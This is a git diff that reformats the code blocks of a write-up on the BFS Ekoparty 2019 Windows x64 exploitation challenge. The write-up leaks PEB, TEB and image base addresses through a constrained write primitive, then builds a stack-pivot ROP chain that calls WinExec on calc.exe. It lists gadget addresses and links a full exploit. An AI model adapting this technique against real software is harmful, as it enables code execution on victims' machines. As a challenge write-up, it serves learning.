@@ -44,14 +44,16 @@ This value will be used in WriteProcessMemory as lpBuffer, basically copying the
 Although this is quite good, it provides a limitation of instructions, meaning we can only use instructions byte+488b01c3c3c3c3.
 I made a quick script in python producing all the values in a file
 
-`byte=0x00
+```
+byte=0x00
 
 endbyte=0xff  
 
 start ="848b01c3c3c3"  
 
 for i in xrange(byte,endbyte+1):  
-            print format(i,'X')+ start`
+            print format(i,'X')+ start
+ ```
 
 
 With a one-liner bash I got all the values:
@@ -70,9 +72,11 @@ We could achieve and acquire the PEB. \x65 is meant for the combination from the
 
 65488b01c3 
 
-`0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
+```
+0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
 
-4:  c3                      ret`
+4:  c3                      ret
+```
 
 
 It is well known that in x64 bit windows, GS register is a special register which points to PEB by providing the accurate offset. In this case since we could control RCX, we pointer GS directly to the PEB which is at offset 0x60 hence the highlighting.  
@@ -85,9 +89,11 @@ Image Base Address is located from the PEB + 0x10 offset. In this case we had to
 
 In this case, according to our possible instructions we chose:  
 
-`0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
+```
+0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
 
-3:  c3                      ret`
+3:  c3                      ret
+```
 
 
 The first byte 47 and these as before are the last bytes of our payload:  
@@ -112,9 +118,11 @@ StackBaseLimit is in the TEB at 0x10 offset through the GS register.
 
 The initial request I used :
 
-`0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
+```
+0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
 
-4:  c3                      ret`
+4:  c3                      ret
+```
 
 I controlled the RCX by setting it to 0x10.  
 
@@ -128,10 +136,11 @@ So now I had the address of the string.
 
 In the above scenario I used: 
 
-`
+```
 0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
 
-3:  c3                      ret`
+3:  c3                      ret
+```
 
 With RCX as the Stack Base Limit and constantly adding 0x08 to it.  
 
@@ -142,19 +151,22 @@ In this case, I need to leak the address from Image Base Address + 0x9010 offset
 
 By using exactly the same instructions as before:
 
-`0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
+```
+0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
 
-3:  c3                      ret`
+3:  c3                      ret
+```
 
 Then adding RCX as the Image Base Address+0x9010 , I get the leaked address for Winexec on the stack.  
 
 For the final request to the application I used 
 
-`0:  51                      push   rcx
+```0:  51                      push   rcx
 
 1:  48 8b 01                mov    rax,QWORD PTR [rcx] 
 
-4:  c3                      ret`
+4:  c3                      ret
+```
 
 I set the RCX to a pivot gadget “add rsp,78h ; ret”, so I can stack pivot.  
 
@@ -170,7 +182,7 @@ The structure of the packet is this. The whole packet is the cookie + 528 charac
 
 Structure:
 
-`|16 junk bytes| - padding  
+```|16 junk bytes| - padding  
 
 |pop_rax_gadget| - Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it.  
 
@@ -210,12 +222,14 @@ Structure:
 
 |calc.exe\x00| - string to set in memory.  
 
-|15 junk bytes| - padding.`
+|15 junk bytes| - padding.
+```
 
 
 Gadgets Used:
 
-`0x14000158b: add rsp, 0x78 ; ret  ;  
+```
+0x14000158b: add rsp, 0x78 ; ret  ;  
 
 0x0000000140004525: pop rdx; add byte ptr [rax], al; cmp word ptr [rax], cx; je 0x4530; xor eax, eax; ret; 
 
@@ -227,7 +241,8 @@ Gadgets Used:
 
 0x14000158f: ret  ;  
 
-0x00000001400011d5: add rsp, 0x28; ret;`
+0x00000001400011d5: add rsp, 0x28; ret;
+```
 
 
 Full Working exploit: [https://github.com/trickster0/BFS-Ekoparty-2019-challenge](https://github.com/trickster0/BFS-Ekoparty-2019-challenge)  
